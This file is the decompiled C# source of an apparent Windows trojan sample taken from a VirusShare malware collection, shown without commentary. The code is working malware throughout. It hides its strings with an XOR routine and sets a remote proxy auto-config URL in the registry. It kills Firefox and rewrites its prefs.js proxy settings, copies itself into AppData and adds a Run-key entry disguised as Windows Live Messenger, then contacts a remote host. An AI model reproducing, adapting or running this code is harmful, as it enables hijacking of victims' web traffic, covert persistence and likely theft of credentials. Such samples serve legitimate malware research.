// Decompiled with JetBrains decompiler
// Type: aEdfhyLJkOxszPPAeSCA.Program
// Assembly: Ritintin_0801, Version=2.1.1.6, Culture=neutral, PublicKeyToken=8e6b72388ca24638
// MVID: 062F0CEF-FA2D-494E-AB0E-2AAD5F73881E
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\Trojan-Ransom.Win32.Blocker.ahku-470ef8b3f5e5c4b83c196fc1d2828e017d476a52f9c59e11d9a09d7d7c1846c8.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Text;

namespace aEdfhyLJkOxszPPAeSCA
{
  internal static class Program
  {
    [STAThread]
    private static void Main()
    {
      string[] strArray1 = new string[2]
      {
        Program.EqDeyEPGRMVCttRaw("mqqu?**`g76dgdwg+uwjc7555+uq*ojjhid*hjapi`v*hjaZrwduu`w*fjkc(}+q}q"),
        Program.EqDeyEPGRMVCttRaw("mqqu?**fw|vqdii||jpwv+fjh*hjapi`v*hjaZrmjvjkilk`*odv*fjkc(}+umu")
      };
      int num1 = 1;
label_33:
      bool flag1 = num1 != 0;
      string str1 = Program.EqDeyEPGRMVCttRaw("qqq(nirkgoj(eik");
      string pjkEeeUbnUmUeBEWLrA = Program.EqDeyEPGRMVCttRaw("mqqu?**udimdfju`q`i`fj+fjh*w`v*rv*vp+umu");
      bool flag2 = true;
      bool MgExPgsPkyzqGRPkjwg = false;
      string str2 = "";
      for (int index = 0; index < strArray1.Length; ++index)
      {
        HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create(new Uri(strArray1[index]));
        httpWebRequest.Timeout = 3000;
        try
        {
          HttpWebResponse response = (HttpWebResponse) httpWebRequest.GetResponse();
          if (response != null)
          {
            if (response.StatusCode == HttpStatusCode.OK)
            {
              string str3 = new WebClient().DownloadString(strArray1[index]);
              if (!flag1)
              {
                if (!str3.Contains(str1))
                  continue;
              }
              str2 = strArray1[index];
              break;
            }
          }
        }
        catch (Exception ex)
        {
        }
      }
      RegistryKey registryKey1 = Registry.CurrentUser.OpenSubKey(Program.EqDeyEPGRMVCttRaw("Vjcqrdw`YHlfwjvjcqYRlkajrvYFpww`kqS`wvljkYLkq`wk`q%V`qqlkbv"), true);
      registryKey1.SetValue(Program.EqDeyEPGRMVCttRaw("Uwj}|Mqqu4+4"), (object) 1, RegistryValueKind.DWord);
      registryKey1.SetValue(Program.EqDeyEPGRMVCttRaw("@kdgi`Mqqu4Z4"), (object) 1, RegistryValueKind.DWord);
      registryKey1.SetValue(Program.EqDeyEPGRMVCttRaw("DpqjFjkclbPwi"), (object) str2, RegistryValueKind.String);
      registryKey1.Close();
      string userName = Environment.UserName;
      string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Program.EqDeyEPGRMVCttRaw("YHj\u007FliidYClw`cj}YUwjcli`v");
      string searchPattern = Program.EqDeyEPGRMVCttRaw("/+a`cdpiq");
      if (Directory.Exists(path))
      {
        foreach (string directory in Directory.GetDirectories(path, searchPattern))
        {
          if (System.IO.File.Exists(directory + Program.EqDeyEPGRMVCttRaw("Yuw`cv+ov")))
          {
            Program.FkAmTIuGmTlCEZjA(Program.EqDeyEPGRMVCttRaw("clw`cj}"));
            StringBuilder stringBuilder = new StringBuilder();
            string[] strArray2 = System.IO.File.ReadAllLines(directory + Program.EqDeyEPGRMVCttRaw("Yuw`cv+ov"));
            int num2;
            for (int index1 = 0; index1 < strArray2.Length; index1 = num2)
            {
              string str4 = strArray2[index1];
              for (int index2 = 0; index2 < 5; ++index2)
              {
                if (str4.Contains(Program.EqDeyEPGRMVCttRaw("pv`wZuw`c-'k`qrjwn+uwj}|+q|u`')%") + index2.ToString() + ");"))
                  str4.Replace(Program.EqDeyEPGRMVCttRaw("pv`wZuw`c-'k`qrjwn+uwj}|+q|u`')%") + index2.ToString() + ");", Program.EqDeyEPGRMVCttRaw("pv`wZuw`c-'k`qrjwn+uwj}|+q|u`')%0,>"));
                stringBuilder.AppendLine(str4);
              }
              stringBuilder.AppendLine("pv`wZuw`c-'k`qrjwn+uwj}|+q|u`')%0,>");
              System.IO.File.WriteAllText(directory + Program.EqDeyEPGRMVCttRaw("Yuw`cv+ov"), stringBuilder.ToString());
              num2 = index1 + 1;
              if (false)
              {
                num1 = num2;
                goto label_33;
              }
            }
          }
        }
      }
      if (flag2)
      {
        string str5 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\OSgzrtQHZUWfKdKGahCA.exe";
        if (System.IO.File.Exists(str5))
          return;
        try
        {
          RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey(Program.EqDeyEPGRMVCttRaw("Vjcqrdw`YHlfwjvjcqYRlkajrvYFpww`kqS`wvljkYWpk"), true);
          registryKey2.SetValue(Program.EqDeyEPGRMVCttRaw("Rlkajrv%Ils`%H`vv`kb`w"), (object) ("\"" + str5 + "\""));
          registryKey2.Flush();
          registryKey2?.Close();
          System.IO.File.Copy(Assembly.GetExecutingAssembly().Location, str5);
        }
        catch (Exception ex)
        {
        }
        Program.cKRuAKhUCdLlAheHUkQ(pjkEeeUbnUmUeBEWLrA, MgExPgsPkyzqGRPkjwg);
      }
      else
        Program.cKRuAKhUCdLlAheHUkQ(pjkEeeUbnUmUeBEWLrA, MgExPgsPkyzqGRPkjwg);
    }

    public static string EqDeyEPGRMVCttRaw(string uKsTiCbkybvHkuKzbg)
    {
      StringBuilder stringBuilder1 = new StringBuilder(uKsTiCbkybvHkuKzbg);
      StringBuilder stringBuilder2;
      if (true)
        stringBuilder2 = stringBuilder1;
      int capacity = uKsTiCbkybvHkuKzbg.Length;
      if (true)
        goto label_14;
label_7:
      int index1 = capacity;
label_8:
      do
        ;
      while (false);
      int num1 = index1;
      StringBuilder stringBuilder3;
      int num2;
      for (int index2 = uKsTiCbkybvHkuKzbg.Length; num1 < index2; num1 = num2)
      {
        num2 = (int) stringBuilder2[index1];
        int num3 = 5;
        if (num3 != 0)
        {
          if (num3 != 0)
          {
            int num4 = (int) (ushort) (num2 ^ num3);
            if (true)
            {
              char ch = (char) num4;
              stringBuilder3.Append(ch);
              int num5 = index1;
              num3 = 1;
              num2 = num5;
            }
            else
            {
              capacity = num4;
              goto label_7;
            }
          }
          capacity = num2 + num3;
          goto label_7;
        }
        else
          index2 = num3;
      }
      return stringBuilder3.ToString();
label_14:
      stringBuilder3 = new StringBuilder(capacity);
      index1 = 0;
      goto label_8;
    }

    public static void FkAmTIuGmTlCEZjA(string jfodysdkORNPcbikTtA)
    {
label_0:
      Process[] processesByName = Process.GetProcessesByName(jfodysdkORNPcbikTtA);
      do
      {
        Process[] processArray = processesByName;
        int num1 = 0;
        int index1;
        if (num1 == 0)
        {
          if (true)
            index1 = num1;
        }
        else
          goto label_8;
label_6:
        if (true)
          num1 = index1;
        else
          goto label_0;
label_8:
        int num2;
        for (int index2 = processArray.Length; num1 < index2; num1 = num2)
        {
          Process process = processArray[index1];
          if (true)
            process.Kill();
          num2 = index1;
          int num3 = 1;
          if (num3 != 0)
          {
            index1 = num2 + num3;
            goto label_6;
          }
          else
            index2 = num3;
        }
      }
      while (false);
    }

    public static void cKRuAKhUCdLlAheHUkQ(string pjkEeeUbnUmUeBEWLrA, bool MgExPgsPkyzqGRPkjwg)
    {
      if (true)
      {
        if (!MgExPgsPkyzqGRPkjwg)
        {
          try
          {
            Process process;
            do
            {
              process = new Process();
              process.StartInfo.FileName = pjkEeeUbnUmUeBEWLrA;
              process.StartInfo.Verb = "Open";
              process.StartInfo.UseShellExecute = true;
              process.StartInfo.WindowStyle = ProcessWindowStyle.Normal;
            }
            while (false);
            process.Start();
            return;
          }
          catch (Exception ex)
          {
            return;
          }
        }
      }
      HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create(new Uri(pjkEeeUbnUmUeBEWLrA));
      httpWebRequest.Timeout = 3000;
      try
      {
        HttpWebResponse response = (HttpWebResponse) httpWebRequest.GetResponse();
        if (response == null)
          return;
        int statusCode = (int) response.StatusCode;
      }
      catch (Exception ex)
      {
      }
    }
  }
}
